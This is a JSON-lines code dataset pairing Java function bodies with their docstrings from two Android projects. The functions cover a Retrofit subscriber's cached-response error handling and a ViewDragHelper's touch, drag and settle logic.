{"docstring": "/**\n * \u5bf9\u9519\u8bef\u8fdb\u884c\u7edf\u4e00\u5904\u7406\n * \u9690\u85cfProgressDialog\n *\n * @param e\n */\n", "func_signal": "@Override\npublic void onError(Throwable e)", "code": "{\n    dismissProgressDialog();\n    /*\u9700\u8981\u7de9\u5b58\u5e76\u4e14\u672c\u5730\u6709\u7f13\u5b58\u624d\u8fd4\u56de*/\n    if (api.isCache()) {//\u5141\u8bb8\u7f13\u5b58\u624d\u8fdb\u5165\u6b64\u65b9\u6cd5\n        Observable.just(api.getUrl()).subscribe(new Subscriber<String>() {\n            @Override\n            public void onCompleted() {\n\n            }\n\n            @Override\n            public void onError(Throwable e) {\n                errorDo(e);\n            }\n\n            @Override\n            public void onNext(String s) {\n                /*\u83b7\u53d6\u7f13\u5b58\u6570\u636e*/\n                CookieResulte cookieResulte = CookieDbUtil.getInstance().queryCookieBy(s);\n                if (cookieResulte == null) {\n                    //\u7f51\u7edc\u83b7\u53d6\u5931\u8d25\uff0c\u540c\u65f6\u6570\u636e\u5e93\u7f13\u5b58\u4e2d\u4e5f\u6ca1\u6709\u8be5\u6570\u636e \u5219\u4f1a\u629b\u51fa\u5f02\u5e38\n                    throw new HttpTimeException(\"\u7f51\u7edc\u9519\u8bef\");//\u8fdb\u5165errorDo(e);\n                }\n                long time = (System.currentTimeMillis() - cookieResulte.getTime()) / 1000;//\u8ba1\u7b97\u5f53\u524d\u65f6\u95f4\u548c\u6570\u636e\u5e93\u7684\u65f6\u95f4\n                if (time < api.getCookieNoNetWorkTime()) {//\u5c0f\u4e8e\u8bbe\u7f6e\u7684\u8d85\u65f6\u65f6\u95f4 \u53d6\u51fa\u7f13\u5b58\n                    if (mSubscriberOnNextListener.get() != null) {\n                        //\u7f51\u7edc\u83b7\u53d6\u5931\u8d25 \u4f46\u662f\u6570\u636e\u5e93\u4e2d\u6709\u8be5\u6570\u636e \u5e76\u4e14\u5728\u7f13\u5b58\u65f6\u95f4\u5185\n                        mSubscriberOnNextListener.get().onCacheNext(cookieResulte.getResulte());\n                    }\n                } else {\n                    //\u7f51\u7edc\u83b7\u53d6\u5931\u8d25 \u867d\u7136\u6570\u636e\u5e93\u4e2d\u6709\u6570\u636e \u4f46\u662f\u8d85\u65f6\u4e86\uff08\u7f13\u5b58\u65f6\u95f4\u8d85\u65f6 \u4e5f\u4f1a\u629b\u51fa\u5f02\u5e38\uff09\n                    CookieDbUtil.getInstance().deleteCookie(cookieResulte);\n                    throw new HttpTimeException(\"\u7f51\u7edc\u9519\u8bef\");//\u8fdb\u5165errorDo(e);\n                }\n            }\n        });\n    } else {\n        errorDo(e);//\u6ca1\u8bbe\u7f6e\u7f13\u5b58 \u90a3\u4e48\u7f51\u7edc\u9519\u8bef\u76f4\u63a5\u5904\u7406\u5f02\u5e38\n    }\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\subscribers\\ProgressSubscriber.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u53d6\u6d88ProgressDialog\u7684\u65f6\u5019\uff0c\u53d6\u6d88\u5bf9observable\u7684\u8ba2\u9605\uff0c\u540c\u65f6\u4e5f\u53d6\u6d88\u4e86http\u8bf7\u6c42\n */\n", "func_signal": "public void onCancelProgress()", "code": "{\n    if (!this.isUnsubscribed()) {\n        this.unsubscribe();\n    }\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\subscribers\\ProgressSubscriber.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * \u83b7\u53d6\u53ef\u5199\u6570\u636e\u5e93\n */\n", "func_signal": "private SQLiteDatabase getWritableDatabase()", "code": "{\n    if (openHelper == null) {\n        openHelper = new DaoMaster.DevOpenHelper(context, dbName, null);\n    }\n    SQLiteDatabase db = openHelper.getWritableDatabase();\n    return db;\n}", "path": "rxretrofitlibrary\\src\\main\\java\\com\\zhxu\\library\\utils\\DbDownUtil.java", "repo_name": "guzhigang001/Bailan", "stars": 532, "license": "apache-2.0", "language": "java", "size": 3459}
{"docstring": "/**\n * Determine if the supplied view is under the given point in the\n * parent view's coordinate system.\n *\n * @param view Child view of the parent to hit test\n * @param x X position to test in the parent's coordinate system\n * @param y Y position to test in the parent's coordinate system\n * @return true if the supplied view is under the given point, false otherwise\n */\n", "func_signal": "public boolean isViewUnder(View view, int x, int y)", "code": "{\n    if (view == null) {\n        return false;\n    }\n    return x >= view.getLeft() &&\n            x < view.getRight() &&\n            y >= view.getTop() &&\n            y < view.getBottom();\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Capture a specific child view for dragging within the parent. The callback will be notified\n * but {@link Callback#tryCaptureView(View, int)} will not be asked permission to\n * capture this view.\n *\n * @param childView Child view to capture\n * @param activePointerId ID of the pointer that is dragging the captured child view\n */\n", "func_signal": "public void captureChildView(View childView, int activePointerId)", "code": "{\n    if (childView.getParent() != mParentView) {\n        throw new IllegalArgumentException(\"captureChildView: parameter must be a descendant \" +\n                \"of the ViewDragHelper's tracked parent view (\" + mParentView + \")\");\n    }\n\n    mCapturedView = childView;\n    mActivePointerId = activePointerId;\n    mCallback.onViewCaptured(childView, activePointerId);\n    setDragState(STATE_DRAGGING);\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Check if any of the edges specified were initially touched in the currently active gesture.\n * If there is no currently active gesture this method will return false.\n *\n * @param edges Edges to check for an initial edge touch. See {@link #EDGE_LEFT},\n *              {@link #EDGE_TOP}, {@link #EDGE_RIGHT}, {@link #EDGE_BOTTOM} and\n *              {@link #EDGE_ALL}\n * @return true if any of the edges specified were initially touched in the current gesture\n */\n", "func_signal": "public boolean isEdgeTouched(int edges)", "code": "{\n    final int count = mInitialEdgesTouched.length;\n    for (int i = 0; i < count; i++) {\n        if (isEdgeTouched(edges, i)) {\n            return true;\n        }\n    }\n    return false;\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Clamp the magnitude of value for absMin and absMax.\n * If the value is below the minimum, it will be clamped to zero.\n * If the value is above the maximum, it will be clamped to the maximum.\n *\n * @param value Value to clamp\n * @param absMin Absolute value of the minimum significant value to return\n * @param absMax Absolute value of the maximum value to return\n * @return The clamped value with the same sign as <code>value</code>\n */\n", "func_signal": "private float clampMag(float value, float absMin, float absMax)", "code": "{\n    final float absValue = Math.abs(value);\n    if (absValue < absMin) return 0;\n    if (absValue > absMax) return value > 0 ? absMax : -absMax;\n    return value;\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Check if we've crossed a reasonable touch slop for the given child view.\n * If the child cannot be dragged along the horizontal or vertical axis, motion\n * along that axis will not count toward the slop check.\n *\n * @param child Child to check\n * @param dx Motion since initial position along X axis\n * @param dy Motion since initial position along Y axis\n * @return true if the touch slop has been crossed\n */\n", "func_signal": "private boolean checkTouchSlop(View child, float dx, float dy)", "code": "{\n    if (child == null) {\n        return false;\n    }\n    final boolean checkHorizontal = mCallback.getViewHorizontalDragRange(child) > 0;\n    final boolean checkVertical = mCallback.getViewVerticalDragRange(child) > 0;\n\n    if (checkHorizontal && checkVertical) {\n        return dx * dx + dy * dy > mTouchSlop * mTouchSlop;\n    } else if (checkHorizontal) {\n        return Math.abs(dx) > mTouchSlop;\n    } else if (checkVertical) {\n        return Math.abs(dy) > mTouchSlop;\n    }\n    return false;\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Check if this event as provided to the parent view's onInterceptTouchEvent should\n * cause the parent to intercept the touch event stream.\n *\n * @param ev MotionEvent provided to onInterceptTouchEvent\n * @return true if the parent view should return true from onInterceptTouchEvent\n */\n", "func_signal": "public boolean shouldInterceptTouchEvent(MotionEvent ev)", "code": "{\n    final int action = MotionEventCompat.getActionMasked(ev);\n    final int actionIndex = MotionEventCompat.getActionIndex(ev);\n\n    if (action == MotionEvent.ACTION_DOWN) {\n        // Reset things for a new event stream, just in case we didn't get\n        // the whole previous stream.\n        cancel();\n    }\n\n    if (mVelocityTracker == null) {\n        mVelocityTracker = VelocityTracker.obtain();\n    }\n    mVelocityTracker.addMovement(ev);\n\n    switch (action) {\n        case MotionEvent.ACTION_DOWN: {\n            final float x = ev.getX();\n            final float y = ev.getY();\n            final int pointerId = MotionEventCompat.getPointerId(ev, 0);\n            saveInitialMotion(x, y, pointerId);\n\n            final View toCapture = findTopChildUnder((int) x, (int) y);\n\n            // Catch a settling view if possible.\n            if (toCapture == mCapturedView && mDragState == STATE_SETTLING) {\n                tryCaptureViewForDrag(toCapture, pointerId);\n            }\n\n            final int edgesTouched = mInitialEdgesTouched[pointerId];\n            if ((edgesTouched & mTrackingEdges) != 0) {\n                mCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n            }\n            break;\n        }\n\n        case MotionEventCompat.ACTION_POINTER_DOWN: {\n            final int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n            final float x = MotionEventCompat.getX(ev, actionIndex);\n            final float y = MotionEventCompat.getY(ev, actionIndex);\n\n            saveInitialMotion(x, y, pointerId);\n\n            // A ViewDragHelper can only manipulate one view at a time.\n            if (mDragState == STATE_IDLE) {\n                final int edgesTouched = mInitialEdgesTouched[pointerId];\n                if ((edgesTouched & mTrackingEdges) != 0) {\n                    mCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n                }\n            } else if (mDragState == STATE_SETTLING) {\n                // Catch a settling view if possible.\n                final View toCapture = findTopChildUnder((int) x, (int) y);\n                if (toCapture == mCapturedView) {\n                    tryCaptureViewForDrag(toCapture, pointerId);\n                }\n            }\n            break;\n        }\n\n        case MotionEvent.ACTION_MOVE: {\n            // First to cross a touch slop over a draggable view wins. Also report edge drags.\n            final int pointerCount = MotionEventCompat.getPointerCount(ev);\n            for (int i = 0; i < pointerCount; i++) {\n                final int pointerId = MotionEventCompat.getPointerId(ev, i);\n                final float x = MotionEventCompat.getX(ev, i);\n                final float y = MotionEventCompat.getY(ev, i);\n                final float dx = x - mInitialMotionX[pointerId];\n                final float dy = y - mInitialMotionY[pointerId];\n\n                reportNewEdgeDrags(dx, dy, pointerId);\n                if (mDragState == STATE_DRAGGING) {\n                    // Callback might have started an edge drag\n                    break;\n                }\n\n                final View toCapture = findTopChildUnder((int) x, (int) y);\n                if (toCapture != null && checkTouchSlop(toCapture, dx, dy) &&\n                        tryCaptureViewForDrag(toCapture, pointerId)) {\n                    break;\n                }\n            }\n            saveLastMotion(ev);\n            break;\n        }\n\n        case MotionEventCompat.ACTION_POINTER_UP: {\n            final int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n            clearMotionHistory(pointerId);\n            break;\n        }\n\n        case MotionEvent.ACTION_UP:\n        case MotionEvent.ACTION_CANCEL: {\n            cancel();\n            break;\n        }\n    }\n\n    return mDragState == STATE_DRAGGING;\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Animate the view <code>child</code> to the given (left, top) position.\n * If this method returns true, the caller should invoke {@link #continueSettling(boolean)}\n * on each subsequent frame to continue the motion until it returns false. If this method\n * returns false there is no further work to do to complete the movement.\n *\n * <p>This operation does not count as a capture event, though {@link #getCapturedView()}\n * will still report the sliding view while the slide is in progress.</p>\n *\n * @param child Child view to capture and animate\n * @param finalLeft Final left position of child\n * @param finalTop Final top position of child\n * @return true if animation should continue through {@link #continueSettling(boolean)} calls\n */\n", "func_signal": "public boolean smoothSlideViewTo(View child, int finalLeft, int finalTop)", "code": "{\n    mCapturedView = child;\n    mActivePointerId = INVALID_POINTER;\n\n    return forceSettleCapturedViewAt(finalLeft, finalTop, 0, 0);\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Check if the specified pointer tracked in the current gesture has crossed\n * the required slop threshold.\n *\n * <p>This depends on internal state populated by\n * {@link #shouldInterceptTouchEvent(MotionEvent)} or\n * {@link #processTouchEvent(MotionEvent)}. You should only rely on\n * the results of this method after all currently available touch data\n * has been provided to one of these two methods.</p>\n *\n * @param directions Combination of direction flags, see {@link #DIRECTION_HORIZONTAL},\n *                   {@link #DIRECTION_VERTICAL}, {@link #DIRECTION_ALL}\n * @param pointerId ID of the pointer to slop check as specified by MotionEvent\n * @return true if the slop threshold has been crossed, false otherwise\n */\n", "func_signal": "public boolean checkTouchSlop(int directions, int pointerId)", "code": "{\n    if (!isPointerDown(pointerId)) {\n        return false;\n    }\n\n    final boolean checkHorizontal = (directions & DIRECTION_HORIZONTAL) == DIRECTION_HORIZONTAL;\n    final boolean checkVertical = (directions & DIRECTION_VERTICAL) == DIRECTION_VERTICAL;\n\n    final float dx = mLastMotionX[pointerId] - mInitialMotionX[pointerId];\n    final float dy = mLastMotionY[pointerId] - mInitialMotionY[pointerId];\n\n    if (checkHorizontal && checkVertical) {\n        return dx * dx + dy * dy > mTouchSlop * mTouchSlop;\n    } else if (checkHorizontal) {\n        return Math.abs(dx) > mTouchSlop;\n    } else if (checkVertical) {\n        return Math.abs(dy) > mTouchSlop;\n    }\n    return false;\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Like all callback events this must happen on the UI thread, but release\n * involves some extra semantics. During a release (mReleaseInProgress)\n * is the only time it is valid to call {@link #settleCapturedViewAt(int, int)}\n * or {@link #flingCapturedView(int, int, int, int)}.\n */\n", "func_signal": "private void dispatchViewReleased(float xvel, float yvel)", "code": "{\n    mReleaseInProgress = true;\n    mCallback.onViewReleased(mCapturedView, xvel, yvel);\n    mReleaseInProgress = false;\n\n    if (mDragState == STATE_DRAGGING) {\n        // onViewReleased didn't call a method that would have changed this. Go idle.\n        setDragState(STATE_IDLE);\n    }\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * {@link #cancel()}, but also abort all motion in progress and snap to the end of any\n * animation.\n */\n", "func_signal": "public void abort()", "code": "{\n    cancel();\n    if (mDragState == STATE_SETTLING) {\n        final int oldX = mScroller.getCurrX();\n        final int oldY = mScroller.getCurrY();\n        mScroller.abortAnimation();\n        final int newX = mScroller.getCurrX();\n        final int newY = mScroller.getCurrY();\n        mCallback.onViewPositionChanged(mCapturedView, newX, newY, newX - oldX, newY - oldY);\n    }\n    setDragState(STATE_IDLE);\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Check if any pointer tracked in the current gesture has crossed\n * the required slop threshold.\n *\n * <p>This depends on internal state populated by\n * {@link #shouldInterceptTouchEvent(MotionEvent)} or\n * {@link #processTouchEvent(MotionEvent)}. You should only rely on\n * the results of this method after all currently available touch data\n * has been provided to one of these two methods.</p>\n *\n * @param directions Combination of direction flags, see {@link #DIRECTION_HORIZONTAL},\n *                   {@link #DIRECTION_VERTICAL}, {@link #DIRECTION_ALL}\n * @return true if the slop threshold has been crossed, false otherwise\n */\n", "func_signal": "public boolean checkTouchSlop(int directions)", "code": "{\n    final int count = mInitialMotionX.length;\n    for (int i = 0; i < count; i++) {\n        if (checkTouchSlop(directions, i)) {\n            return true;\n        }\n    }\n    return false;\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Process a touch event received by the parent view. This method will dispatch callback events\n * as needed before returning. The parent view's onTouchEvent implementation should call this.\n *\n * @param ev The touch event received by the parent view\n */\n", "func_signal": "public void processTouchEvent(MotionEvent ev)", "code": "{\n    final int action = MotionEventCompat.getActionMasked(ev);\n    final int actionIndex = MotionEventCompat.getActionIndex(ev);\n\n    if (action == MotionEvent.ACTION_DOWN) {\n        // Reset things for a new event stream, just in case we didn't get\n        // the whole previous stream.\n        cancel();\n    }\n\n    if (mVelocityTracker == null) {\n        mVelocityTracker = VelocityTracker.obtain();\n    }\n    mVelocityTracker.addMovement(ev);\n\n    switch (action) {\n        case MotionEvent.ACTION_DOWN: {\n            final float x = ev.getX();\n            final float y = ev.getY();\n            final int pointerId = MotionEventCompat.getPointerId(ev, 0);\n            final View toCapture = findTopChildUnder((int) x, (int) y);\n\n            saveInitialMotion(x, y, pointerId);\n\n            // Since the parent is already directly processing this touch event,\n            // there is no reason to delay for a slop before dragging.\n            // Start immediately if possible.\n            tryCaptureViewForDrag(toCapture, pointerId);\n\n            final int edgesTouched = mInitialEdgesTouched[pointerId];\n            if ((edgesTouched & mTrackingEdges) != 0) {\n                mCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n            }\n            break;\n        }\n\n        case MotionEventCompat.ACTION_POINTER_DOWN: {\n            final int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n            final float x = MotionEventCompat.getX(ev, actionIndex);\n            final float y = MotionEventCompat.getY(ev, actionIndex);\n\n            saveInitialMotion(x, y, pointerId);\n\n            // A ViewDragHelper can only manipulate one view at a time.\n            if (mDragState == STATE_IDLE) {\n                // If we're idle we can do anything! Treat it like a normal down event.\n\n                final View toCapture = findTopChildUnder((int) x, (int) y);\n                tryCaptureViewForDrag(toCapture, pointerId);\n\n                final int edgesTouched = mInitialEdgesTouched[pointerId];\n                if ((edgesTouched & mTrackingEdges) != 0) {\n                    mCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n                }\n            } else if (isCapturedViewUnder((int) x, (int) y)) {\n                // We're still tracking a captured view. If the same view is under this\n                // point, we'll swap to controlling it with this pointer instead.\n                // (This will still work if we're \"catching\" a settling view.)\n\n                tryCaptureViewForDrag(mCapturedView, pointerId);\n            }\n            break;\n        }\n\n        case MotionEvent.ACTION_MOVE: {\n            if (mDragState == STATE_DRAGGING) {\n                final int index = MotionEventCompat.findPointerIndex(ev, mActivePointerId);\n                final float x = MotionEventCompat.getX(ev, index);\n                final float y = MotionEventCompat.getY(ev, index);\n                final int idx = (int) (x - mLastMotionX[mActivePointerId]);\n                final int idy = (int) (y - mLastMotionY[mActivePointerId]);\n\n                dragTo(mCapturedView.getLeft() + idx, mCapturedView.getTop() + idy, idx, idy);\n\n                saveLastMotion(ev);\n            } else {\n                // Check to see if any pointer is now over a draggable view.\n                final int pointerCount = MotionEventCompat.getPointerCount(ev);\n                for (int i = 0; i < pointerCount; i++) {\n                    final int pointerId = MotionEventCompat.getPointerId(ev, i);\n                    final float x = MotionEventCompat.getX(ev, i);\n                    final float y = MotionEventCompat.getY(ev, i);\n                    final float dx = x - mInitialMotionX[pointerId];\n                    final float dy = y - mInitialMotionY[pointerId];\n\n                    reportNewEdgeDrags(dx, dy, pointerId);\n                    if (mDragState == STATE_DRAGGING) {\n                        // Callback might have started an edge drag.\n                        break;\n                    }\n\n                    final View toCapture = findTopChildUnder((int) x, (int) y);\n                    if (checkTouchSlop(toCapture, dx, dy) &&\n                            tryCaptureViewForDrag(toCapture, pointerId)) {\n                        break;\n                    }\n                }\n                saveLastMotion(ev);\n            }\n            break;\n        }\n\n        case MotionEventCompat.ACTION_POINTER_UP: {\n            final int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n            if (mDragState == STATE_DRAGGING && pointerId == mActivePointerId) {\n                // Try to find another pointer that's still holding on to the captured view.\n                int newActivePointer = INVALID_POINTER;\n                final int pointerCount = MotionEventCompat.getPointerCount(ev);\n                for (int i = 0; i < pointerCount; i++) {\n                    final int id = MotionEventCompat.getPointerId(ev, i);\n                    if (id == mActivePointerId) {\n                        // This one's going away, skip.\n                        continue;\n                    }\n\n                    final float x = MotionEventCompat.getX(ev, i);\n                    final float y = MotionEventCompat.getY(ev, i);\n                    if (findTopChildUnder((int) x, (int) y) == mCapturedView &&\n                            tryCaptureViewForDrag(mCapturedView, id)) {\n                        newActivePointer = mActivePointerId;\n                        break;\n                    }\n                }\n\n                if (newActivePointer == INVALID_POINTER) {\n                    // We didn't find another pointer still touching the view, release it.\n                    releaseViewForPointerUp();\n                }\n            }\n            clearMotionHistory(pointerId);\n            break;\n        }\n\n        case MotionEvent.ACTION_UP: {\n            if (mDragState == STATE_DRAGGING) {\n                releaseViewForPointerUp();\n            }\n            cancel();\n            break;\n        }\n\n        case MotionEvent.ACTION_CANCEL: {\n            if (mDragState == STATE_DRAGGING) {\n                dispatchViewReleased(0, 0);\n            }\n            cancel();\n            break;\n        }\n    }\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Move the captured settling view by the appropriate amount for the current time.\n * If <code>continueSettling</code> returns true, the caller should call it again\n * on the next frame to continue.\n *\n * @param deferCallbacks true if state callbacks should be deferred via posted message.\n *                       Set this to true if you are calling this method from\n *                       {@link View#computeScroll()} or similar methods\n *                       invoked as part of layout or drawing.\n * @return true if settle is still in progress\n */\n", "func_signal": "public boolean continueSettling(boolean deferCallbacks)", "code": "{\n    if (mDragState == STATE_SETTLING) {\n        boolean keepGoing = mScroller.computeScrollOffset();\n        final int x = mScroller.getCurrX();\n        final int y = mScroller.getCurrY();\n        final int dx = x - mCapturedView.getLeft();\n        final int dy = y - mCapturedView.getTop();\n\n        if (dx != 0) {\n            mCapturedView.offsetLeftAndRight(dx);\n        }\n        if (dy != 0) {\n            mCapturedView.offsetTopAndBottom(dy);\n        }\n\n        if (dx != 0 || dy != 0) {\n            mCallback.onViewPositionChanged(mCapturedView, x, y, dx, dy);\n        }\n\n        if (keepGoing && x == mScroller.getFinalX() && y == mScroller.getFinalY()) {\n            // Close enough. The interpolator/scroller might think we're still moving\n            // but the user sure doesn't.\n            mScroller.abortAnimation();\n            keepGoing = mScroller.isFinished();\n        }\n\n        if (!keepGoing) {\n            if (deferCallbacks) {\n                mParentView.post(mSetIdleRunnable);\n            } else {\n                setDragState(STATE_IDLE);\n            }\n        }\n    }\n\n    return mDragState == STATE_SETTLING;\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Settle the captured view at the given (left, top) position.\n * The appropriate velocity from prior motion will be taken into account.\n * If this method returns true, the caller should invoke {@link #continueSettling(boolean)}\n * on each subsequent frame to continue the motion until it returns false. If this method\n * returns false there is no further work to do to complete the movement.\n *\n * @param finalLeft Settled left edge position for the captured view\n * @param finalTop Settled top edge position for the captured view\n * @return true if animation should continue through {@link #continueSettling(boolean)} calls\n */\n", "func_signal": "public boolean settleCapturedViewAt(int finalLeft, int finalTop)", "code": "{\n    if (!mReleaseInProgress) {\n        throw new IllegalStateException(\"Cannot settleCapturedViewAt outside of a call to \" +\n                \"Callback#onViewReleased\");\n    }\n\n    return forceSettleCapturedViewAt(finalLeft, finalTop,\n            (int) VelocityTrackerCompat.getXVelocity(mVelocityTracker, mActivePointerId),\n            (int) VelocityTrackerCompat.getYVelocity(mVelocityTracker, mActivePointerId));\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Settle the captured view at the given (left, top) position.\n *\n * @param finalLeft Target left position for the captured view\n * @param finalTop Target top position for the captured view\n * @param xvel Horizontal velocity\n * @param yvel Vertical velocity\n * @return true if animation should continue through {@link #continueSettling(boolean)} calls\n */\n", "func_signal": "private boolean forceSettleCapturedViewAt(int finalLeft, int finalTop, int xvel, int yvel)", "code": "{\n    final int startLeft = mCapturedView.getLeft();\n    final int startTop = mCapturedView.getTop();\n    final int dx = finalLeft - startLeft;\n    final int dy = finalTop - startTop;\n\n    if (dx == 0 && dy == 0) {\n        // Nothing to do. Send callbacks, be done.\n        mScroller.abortAnimation();\n        setDragState(STATE_IDLE);\n        return false;\n    }\n\n    final int duration = computeSettleDuration(mCapturedView, dx, dy, xvel, yvel);\n    mScroller.startScroll(startLeft, startTop, dx, dy, duration);\n\n    setDragState(STATE_SETTLING);\n    return true;\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Settle the captured view based on standard free-moving fling behavior.\n * The caller should invoke {@link #continueSettling(boolean)} on each subsequent frame\n * to continue the motion until it returns false.\n *\n * @param minLeft Minimum X position for the view's left edge\n * @param minTop Minimum Y position for the view's top edge\n * @param maxLeft Maximum X position for the view's left edge\n * @param maxTop Maximum Y position for the view's top edge\n */\n", "func_signal": "public void flingCapturedView(int minLeft, int minTop, int maxLeft, int maxTop)", "code": "{\n    if (!mReleaseInProgress) {\n        throw new IllegalStateException(\"Cannot flingCapturedView outside of a call to \" +\n                \"Callback#onViewReleased\");\n    }\n\n    mScroller.fling(mCapturedView.getLeft(), mCapturedView.getTop(),\n            (int) VelocityTrackerCompat.getXVelocity(mVelocityTracker, mActivePointerId),\n            (int) VelocityTrackerCompat.getYVelocity(mVelocityTracker, mActivePointerId),\n            minLeft, maxLeft, minTop, maxTop);\n\n    setDragState(STATE_SETTLING);\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Factory method to create a new ViewDragHelper.\n *\n * @param forParent Parent view to monitor\n * @param sensitivity Multiplier for how sensitive the helper should be about detecting\n *                    the start of a drag. Larger values are more sensitive. 1.0f is normal.\n * @param cb Callback to provide information and receive events\n * @return a new ViewDragHelper instance\n */\n", "func_signal": "public static ViewDragHelper create(ViewGroup forParent, float sensitivity, Callback cb)", "code": "{\n    final ViewDragHelper helper = create(forParent, cb);\n    helper.mTouchSlop = (int) (helper.mTouchSlop * (1 / sensitivity));\n    return helper;\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * Tests scrollability within child views of v given a delta of dx.\n *\n * @param v View to test for horizontal scrollability\n * @param checkV Whether the view v passed should itself be checked for scrollability (true),\n *               or just its children (false).\n * @param dx Delta scrolled in pixels along the X axis\n * @param dy Delta scrolled in pixels along the Y axis\n * @param x X coordinate of the active touch point\n * @param y Y coordinate of the active touch point\n * @return true if child views of v can be scrolled by delta of dx.\n */\n", "func_signal": "protected boolean canScroll(View v, boolean checkV, int dx, int dy, int x, int y)", "code": "{\n    if (v instanceof ViewGroup) {\n        final ViewGroup group = (ViewGroup) v;\n        final int scrollX = v.getScrollX();\n        final int scrollY = v.getScrollY();\n        final int count = group.getChildCount();\n        // Count backwards - let topmost views consume scroll distance first.\n        for (int i = count - 1; i >= 0; i--) {\n            // TODO: Add versioned support here for transformed views.\n            // This will not work for transformed views in Honeycomb+\n            final View child = group.getChildAt(i);\n            if (x + scrollX >= child.getLeft() && x + scrollX < child.getRight() &&\n                    y + scrollY >= child.getTop() && y + scrollY < child.getBottom() &&\n                    canScroll(child, true, dx, dy, x + scrollX - child.getLeft(),\n                            y + scrollY - child.getTop())) {\n                return true;\n            }\n        }\n    }\n\n    return checkV && (ViewCompat.canScrollHorizontally(v, -dx) ||\n            ViewCompat.canScrollVertically(v, -dy));\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
